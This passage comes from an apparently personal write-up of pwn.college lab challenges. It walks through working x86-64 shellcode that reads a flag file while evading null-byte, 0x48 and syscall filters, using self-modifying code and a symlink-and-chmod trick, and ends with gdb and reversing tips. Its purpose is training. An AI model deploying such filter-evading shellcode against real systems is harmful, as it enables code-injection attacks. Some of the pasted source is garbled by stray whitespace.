	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel

	# Exit the program cleanly
	push 60 				# system call number
	pop rax					# pop system call number in rax
	push 69					# exit number
	pop rdi					# pop exit number in rdi
	syscall
</code></pre>
<p>And we should have a shellcode that contains no null bytes, just like the program asks us, let's make sure we did everything right :</p>
<pre><code>$ gcc -w -nostdlib -static -o shell shellcode.s -masm=intel
$ ./shell
flag{fake_flag_for_testing}
$ objcopy --dump-section .text=solver shell
$ xxd solver
</code></pre>
<p>After running xxd on the resulting file you should see all the bytes in hexadecimal the shellcode actually has, if it contains any &quot;00&quot; we have failed the shellcode, if it don't we successfully achieved what we wanted to :</p>
<pre><code>$ xxd solver
00000000: 4831 f6bb 666c 6167 48c1 e308 b32f 5348  H1..flagH..../SH
00000010: 89e7 6a02 580f 056a 015f 505e 4831 d26a  ..j.X..j._P^H1.j
00000020: 6441 5a6a 2858 0f05 6a3c 586a 2a5f 0f05  dAZj(X..j&lt;Xj*_..
</code></pre>
<p>And it looks to me like we were able to evade this no null-bytes filter on the shellcode !</p>
<p>Let's prove it :</p>
<pre><code>$ ./babyshell_level3 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>:)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-4"><a class="header" href="#babyshell-level-4">Babyshell Level 4</a></h1>
<p>This challenge was a bit like the last one, but this time the filter checks for the byte 0x48, so we need to test different registers to see which cause the opcode 0x48 and which register doesn't.</p>
<h2 id="solving-the-challenge-7"><a class="header" href="#solving-the-challenge-7">Solving The Challenge</a></h2>
<p>So we are going to start looking at every restriction on the current instruction in our program, since the challenge is pretty much the same we can just take the same shellcode we used in the precedent level and objdump it, this way we can see where our shellcode can potentially fail and which instructions we need to fix.</p>
<p>Also you can use the pwn.asm() functions instead of compiling the code and checking with objdump.</p>
<p>Those are the following restrictions on instructions i've had to deal with during the course of this challenge :</p>
<p>mov rdi, rsp - can't be used since it has a 0x48 in it's opcode
shl rbx, 8   - can't be used since it has a 0x48 in it's opcode</p>
<p>I've made a program that does shl, shr, rol, ror, sar, sal. Note how each of these instructions starts with the opcode 0x48, which we need to evade... this means we won't be able to use these instructions, also note that the instruction <strong>sal</strong> was translated to <strong>shl</strong> during compilation of the program :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c1 e3 08             shl    rbx,0x8
401004:       48 c1 e0 08             shl    rax,0x8
401008:       48 c1 e2 08             shl    rdx,0x8
40100c:       48 c1 e6 08             shl    rsi,0x8
401010:       48 c1 e7 08             shl    rdi,0x8
401014:       48 c1 c3 08             rol    rbx,0x8
401018:       48 c1 c0 08             rol    rax,0x8
40101c:       48 c1 c2 08             rol    rdx,0x8
401020:       48 c1 c6 08             rol    rsi,0x8
401024:       48 c1 c7 08             rol    rdi,0x8
401028:       48 c1 eb 08             shr    rbx,0x8
40102c:       48 c1 e8 08             shr    rax,0x8
401030:       48 c1 ea 08             shr    rdx,0x8
401034:       48 c1 ee 08             shr    rsi,0x8
401038:       48 c1 ef 08             shr    rdi,0x8
40103c:       48 c1 e3 08             shl    rbx,0x8
401040:       48 c1 e0 08             shl    rax,0x8
401044:       48 c1 e2 08             shl    rdx,0x8
401048:       48 c1 e6 08             shl    rsi,0x8
40104c:       48 c1 e7 08             shl    rdi,0x8
401050:       48 c1 cb 08             ror    rbx,0x8 
401054:       48 c1 c8 08             ror    rax,0x8
401058:       48 c1 ca 08             ror    rdx,0x8
40105c:       48 c1 ce 08             ror    rsi,0x8
401060:       48 c1 cf 08             ror    rdi,0x8
401064:       48 c1 fb 08             sar    rbx,0x8
401068:       48 c1 f8 08             sar    rax,0x8
40106c:       48 c1 fa 08             sar    rdx,0x8
401070:       48 c1 ff 08             sar    rdi,0x8
401074:       48 c1 fe 08             sar    rsi,0x8
401078:       48 c1 e3 08             shl    rbx,0x8
40107c:       48 c1 e0 08             shl    rax,0x8
401080:       48 c1 e2 08             shl    rdx,0x8
401084:       48 c1 e7 08             shl    rdi,0x8
401088:       48 c1 e6 08             shl    rsi,0x8
</code></pre>
<p>We can conclude that we can't use bit shifting (shl, shr), bit rotating (ror, rol) or bit arithmetic shifting (sal, sar)</p>
<p>Next i've noticed some 0x48 bytes in the opcode of the &quot;<strong>mov rdi, rsp</strong>&quot; instruction... for this reason we are going to try to move every register possible inside rdi, to achieve this i wrote the following program (note how we were able to evade the filter using the r10 register) :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c7 c0 01 00 00 00    mov    rax,0x1
401007:       48 89 c7                mov    rdi,rax
40100a:       48 89 c6                mov    rsi,rax
40100d:       48 89 f7                mov    rdi,rsi
401010:       48 89 c3                mov    rbx,rax
401013:       48 89 df                mov    rdi,rbx
401016:       48 89 c2                mov    rdx,rax
401019:       48 89 d7                mov    rdi,rdx
40101c:       49 89 c2                mov    r10,rax
40101f:       4c 89 d7                mov    rdi,r10
401022:       50                      push   rax
401023:       48 89 e7                mov    rdi,rsp
401026:       48 31 ff                xor    rdi,rdi
401029:       48 31 c0                xor    rax,rax
40102c:       48 31 f6                xor    rsi,rsi
40102f:       4d 31 d2                xor    r10,r10
401032:       48 31 db                xor    rbx,rbx
401035:       48 31 d2                xor    rdx,rdx
401038:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
40103f:       48 c7 c7 2a 00 00 00    mov    rdi,0x2a
401046:       0f 05                   syscall
</code></pre>
<p>Notice that the <strong>xor instruction</strong> has the byte 0x48 in his opcode, for this reason we are going to need to avoid using the <strong>xor instruction</strong>.</p>
<p>So after noticing that i could bypass the filter using r10 register, i asked myself if i could use either a <strong>shr, shl, ror, rol, sar, sal</strong> instruction on the r10 register to bypass the filter :</p>
<pre><code class="language-x86asm">40108c:       49 c1 e2 08             shl    r10,0x8
401090:       49 c1 ea 08             shr    r10,0x8
401094:       49 c1 e2 08             shl    r10,0x8
401098:       49 c1 fa 08             sar    r10,0x8
40109c:       49 c1 ca 08             ror    r10,0x8
4010a0:       49 c1 c2 08             rol    r10,0x8
</code></pre>
<p>As you can notice it turns out that the r10 register does indeed bypass the filter, ALL HAIL R10 !!!! :)</p>
<p>So we can start writing the first part of our shellcode which is opening a file descriptor on the &quot;/flag&quot; file, in our case we won't be able to use rbx for our bit shifting like the last challenge since we can't shift rbx without causing a 0x48 opcode, which will make us fail the challenge.</p>
<p>For this reason i have used r10 in my code !</p>
<p>Other problem i ran into, <strong>rsi/rdx</strong> were set to some random values when i executed my shellcode so i'm going to need to clear them out, but i can't use <strong>xor rsi,rdi</strong> or <strong>xor rdx, rdx</strong>... in this case i will do <strong>xor r10, r10</strong> and then move r10 into rdx and rsi.</p>
<p>Next problem i ran into while trying to solve this challenge is that you can't directly move 0x2 into rax without having a 0x48 opcode, for this reason i am going to put 0x2 in the lower 8 bits of r10 (<strong>r10b</strong>) and do a <strong>mov al, r10b</strong>.</p>
<p>With all these problem fixed our open syscall should be able to bypass the filter imposed, let's write the first partof our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall
</code></pre>
<p>Next step would be to use our sendfile instruction to read the file and send it out to the standard output file descriptor (0)...</p>
<p>We can pretty much rewrite the same as we did for the last challenge and it should work,... let's do that :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall

    # Read a the file we just opened and send it to stdout
    push 1
    pop rdi
    push rax
    pop rdi
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    push 42
    pop rdi
    syscall
</code></pre>
<p>Now you can just compile it, extract the bytes from the <strong>.text</strong> section and we should win the challenge ! Let's prove that it works :</p>
<pre><code>$ gcc -w -nostdlib -static shellcode.s -o shellcode -masm=intel
$ objcopy --dump-section .text=solver shellcode
$ ./babyshell_level4 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>Annnnnd we did bypass the filter, it was pretty easy and nice to solve, if you had problems doing it on your own remember you can write programs to test instructions and dump their opcode using the objdump -D switch. :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-5"><a class="header" href="#babyshell-level-5">Babyshell Level 5</a></h1>
<p>Okay ! Now we are talking, this challenge was a little bit harder than the previous one, but was really fun to solve. Itried to solved it for like 3 hours before i quitted and the next day i was able to complete it on my own.</p>
<h2 id="solving-the-challenge-8"><a class="header" href="#solving-the-challenge-8">Solving the Challenge</a></h2>
<p><strong>What is the task :</strong> We need to write a shellcode that does not contains any <strong>syscall</strong> (0x0f05), <strong>sysenter</strong> (0x0f34) or <strong>int</strong> (0x80cd) opcodes in our shellcode, this makes it a LOT harder for us to call into the kernel since we n eed to write <strong>self-modifying code</strong>, for this challenge we will heavily rely on labels, make sure you know what they  are before jumping into this !</p>
<p>So, after a bit of researching on how i could write this &quot;self-modifying&quot; shellcode, i found on discord that we could use a label for that, we are going to put <strong>.word</strong> values in our labels, with the value of 0x0000, however when the program will run, it will modify the value of our <strong>.word</strong> in the label for the syscall opcode, and we can just call the location of [rip+label] to execute the syscall instructions, let's start writing code :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # prepare syscall
    mov byte ptr[rip+syscall1], 0x0f
    mov byte ptr[rip+syscall1+1], 0x05
    lea r9, [rip+syscall1]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    xor r10, r10

    # open file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9                 # syscall we jump inside our label

# sys_sendfile
syscall1:
    .word 0x0000
    
    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+syscall2], 0x0f
    mov byte ptr[rip+syscall2+1], 0x05
    lea r9, [rip+syscall2]

    xor rsi, rsi
    xor r10,r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi, 1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9

# sys_exit
syscall2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+syscall3], 0x0f
    mov byte ptr[rip+syscall3], 0x05
    lea r9, [rip+syscall3]
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

syscall3:
    .word 0x0000
</code></pre>
<p>I am not sure it's the best optimized way to do this challenge, but i decided to do it this way and it works pretty well, i do a lot of registers clearing because i had an issue with the program where registers would change before executing syscall, by clearing register i was able to execute each syscalls and write the flag properly :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-6"><a class="header" href="#babyshell-level-6">BabyShell Level 6</a></h1>
<p>This one was a easy level, extremely similar to the last one we just did, but this time the first 4096 bytes of the program have been removed write permissions, this means we can't write shellcode on the stack unless we put 4096 bytes of junk before our shellcode.</p>
<p><em>Note that we still have the same filter on syscalls than the last challenge, for this reason we will reuse the shellcode i wrote.</em></p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    .rept 4096
    nop
    .endr

    # prepare syscall
    mov byte ptr[rip+label], 0x0f
    mov byte ptr[rip+label+1], 0x05
    lea r9, [rip+label]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor r10, r10

    # open flag file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9

label:
    .word 0x0000

    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+label2], 0x0f
    mov byte ptr[rip+label2+1], 0x05
    lea r9, [rip+label2]

    xor rsi, rsi
    xor r10, r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi,1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9
label2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+label3], 0x0f
    mov byte ptr[rip+label3+1], 0x05
    lea r9, [rip+label3]
    # exit
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

label3:
    .word 0x0000
</code></pre>
<p>Compile the shellcode with gcc <code>gcc -w -nostdlib -static solve.s -o solve</code>, then you can extract the bytes of the <code>.text section</code> using <code>objcopy --dump-section .text=solver ./solve</code>, then you can run the program with our solver file redirected to standard input <code>./babyshell_level6 &lt;solver</code>. </p>
<p>Another cool thing is that we are given the source code for this challenge which is the following one.</p>
<pre><code class="language-c">#define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
#include &lt;sys/mman.h&gt;                                                                                                                                                                                                               [66/1973]#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
#include &lt;unistd.h&gt;                                                                                                                                                                                                                          #include &lt;stdio.h&gt;
                                                                                                                                                                                                                                             #include &lt;capstone/capstone.h&gt;
                                                                                                                                                                                                                                             #define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
                                                                                                                                                                                                                                             void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                                                                                                                                                                                                                                                                            void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                               
        return;
    }                                                                                                                                                                                                                               [43/1973]
    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &amp;insn);
    if (count &gt; 0)
    {                                                                                                                                                                                                                                                size_t j;                                                                                                                                                                                                                                    printf(&quot;      Address      |                      Bytes                    |          Instructions\n&quot;);                                                                                                                                      printf(&quot;------------------------------------------------------------------------------------------\n&quot;);                                                                                                                              
        for (j = 0; j &lt; count; j++)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)insn[j].address);
            for (int k = 0; k &lt; insn[j].size; k++) printf(&quot;%02hhx &quot;, insn[j].bytes[k]);
            for (int k = insn[j].size; k &lt; 15; k++) printf(&quot;   &quot;);
            printf(&quot; | %s %s\n&quot;, insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf(&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;);                                                                                                                                                                            printf(&quot;      Address      |                      Bytes\n&quot;);                                                                                                                                                                                 printf(&quot;--------------------------------------------------------------------\n&quot;);                                                                                                                                                            for (unsigned int i = 0; i &lt;= shellcode_size; i += 16)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)shellcode_addr+i);
            for (int k = 0; k &lt; 16; k++) printf(&quot;%02hhx &quot;, ((uint8_t*)shellcode_addr)[i+k]);
            printf(&quot;\n&quot;);
        }
    }

    cs_close(&amp;handle);
}

void *shellcode_mem;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    assert(argc &gt; 0);

    printf(&quot;###\n&quot;);
    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
    printf(&quot;###\n&quot;);
    printf(&quot;\n&quot;);

    puts(&quot;This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them&quot;);
    puts(&quot;as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will&quot;);
    puts(&quot;practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing&quot;);
    puts(&quot;other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.\n&quot;);
    for (int i = 3; i &lt; 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode_mem = mmap((void *) 0x14c61000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    printf(&quot;[LEAK] Mapping shellcode memory at %p!\n&quot;, shellcode_mem);
    assert(shellcode_mem == (void *) 0x14c61000);

    puts(&quot;Reading 0x2000 bytes from stdin.\n&quot;);
    shellcode_size = read(0, shellcode_mem, 0x2000);
    assert(shellcode_size &gt; 0);

    puts(&quot;Executing filter...\n&quot;);
    puts(&quot;This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls&quot;);
    puts(&quot;are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05&quot;);
    puts(&quot;(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to&quot;);
    puts(&quot;insert the `syscall` instructions at runtime.\n&quot;);
    for (int i = 0; i &lt; shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t*)shellcode_mem + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf(&quot;Failed filter at byte %d!\n&quot;, i);
            exit(1);
        }
    }

    puts(&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;);
    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

    puts(&quot;This challenge is about to execute the following shellcode:\n&quot;);
    print_disassembly(shellcode_mem, shellcode_size);
    puts(&quot;&quot;);

    puts(&quot;Executing shellcode!\n&quot;);
    ((void(*)())shellcode_mem)();
</code></pre>
<p>First thing to note is that the program uses the <code>libcapstone</code> library as a disassembly framework, capstone will basically take the raw bytes we sent to it and disassemble them, then print the instructions to the screen. If you want to know more about disassembling raw bytes using <a href="http://www.capstone-engine.org">capstone</a>, make sure to check the section <a href="http://www.capstone-engine.org/lang_c.html">here</a> for the C language.</p>
<p>So in main we first allocate 0x2000 bytes of memory space at address 0x14c61000, then we read 2000 bytes of input at this address (our shellcode), and finally at the end we call our shellcode <code>((void(*)())shellcode_mem)()</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-7"><a class="header" href="#babyshell-level-7">BabyShell Level 7</a></h1>
<p>Level 7 ! This level was kinda cool not gonna lie, although i am pretty sure i ended up doing it an intended way...</p>
<p>The challenges closes <code>stdout</code> and <code>stderr</code>, so outputting the flag to the screen won't be possible in this challenge,... well i think so.</p>
<p>This is when i got the idea of opening 2 file descriptors (<code>flag.txt</code>, <code>a.out</code>) and use the <code>sendfile</code> systemcall to send the content of the first file descriptor <code>flag.txt</code> to the second file <code>a.out</code>, we will need to set the right permissions on the file because since the program runs with SUID bit enabled, it will output the file with root permissions and group <code>hacker</code>. </p>
<p>We can set the flags to <code>S_IRGRP</code> on our open call to the <code>a.out</code> file and this will open the file with the right permissions needed, another thing you gonna need to do is to open the file in mode <code>O_CREAT | O_RDWR</code> because we want the file to be created if it doesn't already exist. Alternatively you can just <code>touch</code> a file in the <code>/tmp</code> directory, call it a.out and it should be able to open the file in the right mode.</p>
<p>To solve this challenge i used the following shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Open
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    mov rax, 2
    syscall
    # Store file descriptor inside r6
    mov r10, rax

    # Open
    mov ebx, 0x74756f2e
    shl rbx, 8
    mov bl, 0x61
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    or rsi, 0x40
    mov rdx, 32
    mov rax, 2
    syscall
    # Store file descriptor inside r7
    mov r9, rax

    # Read
    mov rdi, r9
    mov rsi, r10
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall

    mov r10, rsi
    # Close flag.txt
    mov rdi, r9
    mov rax, 3
    syscall
    # Close a.out
    mov rdi, r10
    mov rax, 3
    syscall

    # Exit
    mov rax, 60
    mov rdi, 5
    syscall
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-8"><a class="header" href="#babyshell-level-8">Babyshell Level 8</a></h1>
<p>This challenge was relatively easy, just have to think outside the box a little.</p>
<p>The shellcode is reading 0x12 bytes of input this means we can't send a shellcode bigger than 0x12 bytes to our program.</p>
<p>The best option to my eyes was to call a chmod on the file directly, but you can't call chmod on /flag with less than 0x12 bytes, so for this reason i made a symlink to the binary in our home directory (&quot;file named: shell8&quot;) and a symlink to the flag in the home directory (&quot;file named : a&quot;).</p>
<pre><code>$ ln -sf /challenge/babyshell_level8 ~/shell8
$ ln -sf /flag ~/a
</code></pre>
<p>Then with the following shellcode you should be able to chmod the symlink to the flag file.</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	push 0x61 ; &quot;a&quot; character
	push rsp 
	pop rdi
	mov sil, 4
	mov al, 90
	syscall
</code></pre>
<pre><code>$ gcc -nostdlib -static -o shellcode
$ objcopy --dump-section .text=shell shellcode
$ scp shell hacker@dojo.pwn.college:/tmp
$ ssh hacker@dojo.pwn.college
$ cd ~
$ ./shell8 &lt;/tmp/shell
$ cat a
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-5"><a class="header" href="#baby-reversing-level-5">Baby Reversing Level 5</a></h1>
<p>Level was easy to do and i wrote a small script to reverse the order of characters, almost absolutely pointless but here it is...</p>
<pre><code class="language-py">INPUT = input(&quot;Enter a 5 characters license : &quot;)

for i in range(2):
	first_char = INPUT[i]
	eax = 4
	last_char = INPUT[eax-i]
	STRING = list(INPUT)
	STRING[i] = last_char
	STRING[eax-i] = first_char
	print(&quot;&quot;.join(STRING))
	INPUT = STRING

print(STRING)

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="baby-reversing-level-10"><a class="header" href="#baby-reversing-level-10">Baby Reversing Level 10</a></h1>
<p>I'm making a writeup on this one cause i was able to make a cool little one liner to solve this challenge.</p>
<pre><code class="language-py">&gt;&gt;&gt; l = [170, 184, 168, 175, 191]
&gt;&gt;&gt; &quot;&quot;.join([bytes.fromhex(str(hex(i ^ 4294967259)[8:])).decode() for i in l])
'qcstd'
</code></pre>
<p>Inputting <code>qcstd</code> to the program outputs us the flag.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-2"><a class="header" href="#embryogdb-level-2">EmbryoGDB Level 2</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge"><a class="header" href="#right-way-to-solve-the-challenge">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : You can see values for all your registers with <code>info registers</code>. Alternatively, you can also just print a particular register's value with the <code>print</code> command, or <code>p</code> for short. For example, <code>p $rdi</code> will print the value of $rdi in decimal. You can also print it's value in hex with <code>p/x $rdi</code>.</p>
<p>In order to solve this level, you must figure out the current random value of register r12 in hex.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; p/x $r12
$4 = 0xdf95a693d3e597cb

gdb&gt; r
Continuing.
Random value: df95a693d3e597cb
Your input: df95a693d3e597cb
The correct answer is: df95a693d3e597cb
You win! Here is your flag:
pwn.college{REDACTED}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-3"><a class="header" href="#embryogdb-level-3">EmbryoGDB Level 3</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge-1"><a class="header" href="#right-way-to-solve-the-challenge-1">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : You can examine the contents of memory using the <code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;</code>. In this format <code>&lt;u&gt;</code> is the unit size to display, <code>&lt;f&gt;</code> is the format to display it in, and <code>&lt;n&gt;</code> is the number of elements to display. Valid unit sizes are <code>b</code> (1 byte), <code>h</code> (2 bytes), <code>w</code> (4 bytes), and <code>g</code> (8 bytes). Valid formats are <code>d</code> (decimal), <code>x</code> (hexadecimal), <code>s</code> (string), <code>i</code> (instruction). The address can be specified using a register name, symbol name, or absolute address. Additionally, you can supply mathematical expressions when specifying the address.</p>
<p>For  example, <code>x/8i $rip</code> will print the next 8 instructions from the current instruction pointer. <code>x/16i main</code> will print the first 16 instructions of the main function. You can also use <code>disassemble main</code>, or <code>disas main</code> for short, to print all of the instructions of main. Alternatively, <code>x/16gx $rsp</code> will print the first 16 values on the stack. <code>x/gx $rbp-0x32</code> will print the local variable stored there on the stack.</p>
<p>You will probably want to view your instructions using the CORRECT assembly syntax. You can do that with the command <code>set disassembly-flavor intel</code>.</p>
<p>In order to solve this level, you must figure out the random value on the stack (the value read in from <code>/dev/urandom</code>). Think about what the arguments to the read system call are.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; disass main
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   0x000056488bdccc31 &lt;+395&gt;:   lea    rdi,[rip+0xbd5]        # 0x56488bdcd80d &lt;&quot;/dev/urandom&quot;&gt;
   0x000056488bdccc38 &lt;+402&gt;:   mov    eax,0x0
   0x000056488bdccc3d &lt;+407&gt;:   call   0x56488bdcc250 &lt;open@plt&gt; # call to open
   0x000056488bdccc42 &lt;+412&gt;:   mov    ecx,eax
   0x000056488bdccc44 &lt;+414&gt;:   lea    rax,[rbp-0x18]		# buffer we will read in
   0x000056488bdccc48 &lt;+418&gt;:   mov    edx,0x8
   0x000056488bdccc4d &lt;+423&gt;:   mov    rsi,rax
   0x000056488bdccc50 &lt;+426&gt;:   mov    edi,ecx
   0x000056488bdccc52 &lt;+428&gt;:   call   0x56488bdcc210 &lt;read@plt&gt; # call to read

gdb&gt; x/gx $rbp-0x18
0x7ffc2ab310e8: 0x6ce885632f7847a9

gdb&gt; c
Continuing.
Random value: 6ce885632f7847a9
You input: 6ce885632f7847a9
The correct answer is: 6ce885632f7847a9
You win! Here is your flag:
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryogdb-level-4"><a class="header" href="#embryogdb-level-4">EmbryoGDB Level 4</a></h1>
<p>Every Single challenges of the embryogdb suit of challenges can be completed using the following gdb commands.</p>
<pre><code>gdb&gt; call (void)win()
pwn.college{REDACTED}

or

gdb&gt; info functions win
Non-debugging symbols:
0x000055e66e4f0a86  main

gdb&gt; set $rip=0x000055e66e4f0a86
gdb&gt; c
pwn.college{REDACTED}
</code></pre>
<h2 id="right-way-to-solve-the-challenge-2"><a class="header" href="#right-way-to-solve-the-challenge-2">Right way to solve the challenge</a></h2>
<p><strong>Task</strong> : There are a number of ways to move forward in the program's execution. You can use the <code>stepi &lt;n&gt;</code> command, or <code>si &lt;n&gt;</code> for short, in order to step forward one instruction. You can use the <code>nexti &lt;n&gt;</code> command, or <code>ni &lt;n&gt;</code> for short, in order to step forward one instruction, while stepping over any function calls. The <code>&lt;n&gt;</code> parameter is optional, but allows you to perform multiple steps at once. You can use the <code>finish</code> command in order to finish the currently executing function. You can use the <code>break *&lt;address&gt;</code> parameterized command in order to set a breakpoint at the specified-address. You have already used the <code>continue</code> command, which will continue execution until the program hits a breakpoint.</p>
<p>While stepping through a program, you may find it useful to have some values displayed to you at all times. There are multiple ways to do this. The simplest way is to use the <code>display/&lt;n&gt;&lt;u&gt;&lt;f&gt;</code> parameterized command, which follows exactly the same format as the <code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt;</code> parameterized command. For example, <code>display/8i $rip</code> will always show you the next 8 instructions. On the other hand, <code>display/4gx $rsp</code> will always show you the first 4 values on the stack. Another option is to use the <code>layout regs</code> command. This will put gdb into its TUI mode and show you the contents of all of the registers, as well as nearby instructions.</p>
